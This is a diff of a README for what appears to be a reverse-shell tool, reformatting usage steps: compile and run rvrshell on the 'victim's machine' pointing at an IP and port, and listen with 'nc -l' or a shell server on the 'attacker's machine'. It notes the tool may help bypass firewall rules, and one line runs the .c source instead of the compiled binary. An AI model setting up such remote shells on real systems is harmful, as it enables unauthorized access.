@@ -6,17 +6,18 @@ Target system(victim) acts an client and sever is setup by connection initiator(
 * May help an attacker to bypass incoming connection firewall rules.
 
 ### usage of reverseShell
+* victim's machine
 <code>
-    # victim's machine
-    gcc rvrshell.c -o rvrshell <br> 
+    gcc rvrshell.c -o rvrshell && 
     ./rvrshell [IPV4 Addr] [port]
     
 </code><br>
+* attacker's machine:
 <code>
-    # attacker's machine <br>
-    nc -l [port] <br>
-      <or>  <br>
-    gcc shellsrv.c -o srv <br>
+      nc -l [port] <br>
+</code><br>
+<code>
+    gcc shellsrv.c -o srv &&
     ./shellsrv.c [port]
 </code>
 
